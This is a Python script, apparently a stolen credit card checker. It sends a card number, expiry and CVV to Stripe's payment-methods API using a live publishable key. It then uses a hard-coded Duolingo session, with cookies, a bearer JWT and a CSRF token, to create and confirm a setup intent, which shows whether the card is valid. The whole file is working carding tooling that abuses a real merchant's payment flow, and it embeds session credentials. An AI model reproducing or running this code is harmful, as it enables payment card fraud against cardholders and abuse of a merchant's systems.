import requests


def chak(cc,mes,ano,cvv):
    
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={ano}&card[exp_month]={mes}&billing_details[address][country]=CO&payment_user_agent=stripe.js%2Fb530bb8344%3B+stripe-js-v3%2Fb530bb8344%3B+payment-element%3B+deferred-intent&time_on_page=109418&guid=c1045557-440e-4f08-86d0-6236b7592dfd&muid=1f97ee12-0b18-4290-9839-57ee09922b67&sid=05afa114-c451-4568-b918-10c6b1f0efa8&key=pk_live_wGV2ziRFq7KJLNaVUAJgrzDf'
    try:
        req1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        idw = req1.json()['id']
        if not  idw: return req1
        else:
            cookies = {
            'lang': 'es',
            'tsl': '1693601122725',
            'lu': 'https://es.duolingo.com/',
            'lp': 'splash',
            'OptanonConsent': 'isGpcEnabled=1&datestamp=Fri+Sep+01+2023+15%3A45%3A23+GMT-0500+(hora+est%C3%A1ndar+de+Colombia)&version=6.16.0&isIABGlobal=false&consentId=9e6b9453-cdcd-471e-93c4-f879b6c86134&interactionCount=0&landingPath=https%3A%2F%2Fes.duolingo.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A0&hosts=H3%3A1%2CH14%3A1%2CH11%3A1%2CH1%3A0%2CH15%3A0%2CH6%3A0%2CH22%3A0%2CH2%3A0%2CH26%3A0%2CH7%3A0%2CH16%3A0%2CH9%3A0%2CH28%3A0%2CH18%3A0%2CH10%3A0%2CH12%3A0%2CH13%3A0',
            'lr': '',
            'jwt_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxMjQ4NTg5NzIwfQ.AeENogUQfeKjV3JTY1Rs3k6OfKxhFmPLH-f4Cr1l9rk',
            'csrf_token': 'ImY2ZDAxMzIwOGY4MTQ5Y2FiMjQxMzE4NzZkNTdhODRhIg==',
            'logged_out_uuid': '1248589720',
            'logged_in': 'true',
            'g_state': '{"i_l":0}',
            'AWSALB': 'fY5qXwODxNmkKJH46oLa6gW7NlrnRTEYMU/XOZUz5RFT15YembL8yfsLeFd9ym028lkmr/jNf0i94i8ASloc0o7cjx8EYcVMBEPVpY6lFte+gqU4frZuFGbUK52B',
            'AWSALBCORS': 'fY5qXwODxNmkKJH46oLa6gW7NlrnRTEYMU/XOZUz5RFT15YembL8yfsLeFd9ym028lkmr/jNf0i94i8ASloc0o7cjx8EYcVMBEPVpY6lFte+gqU4frZuFGbUK52B',
        }

            headers = {
            'authority': 'es.duolingo.com',
            'accept': 'application/json; charset=UTF-8',
            'accept-language': 'es-ES,es;q=0.9',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxMjQ4NTg5NzIwfQ.AeENogUQfeKjV3JTY1Rs3k6OfKxhFmPLH-f4Cr1l9rk',
            'content-type': 'application/json; charset=UTF-8',
            'idempotency-key': 'pm_1NleIoCr1cvUccnXPuvdB5ek',
            'origin': 'https://es.duolingo.com',
            'referer': 'https://es.duolingo.com/learn',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'x-amzn-trace-id': 'User=1248589720',
            'x-requested-with': 'XMLHttpRequest',
        }

            json_data = {
            'paymentMethodId': req1.json()['id'],
            'product': 'DUOLINGO',
        }

            req2 = requests.post(
            'https://es.duolingo.com/2017-06-30/users/1248589720/create-setup',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )

            headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        }

            data = {
            'return_url': 'https://es.duolingo.com/learn',
            'payment_method':  req1.json()['id'],
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': 'pk_live_wGV2ziRFq7KJLNaVUAJgrzDf',
            'client_secret': req2.json()['clientSecret'],
        }
            seti =  req2.json()['clientSecret'].split('_secret_')
            req3 = requests.post(
            f'https://api.stripe.com/v1/setup_intents/{seti[0]}/confirm',
            headers=headers,
            data=data,
        )

            return req3
    except: return req1
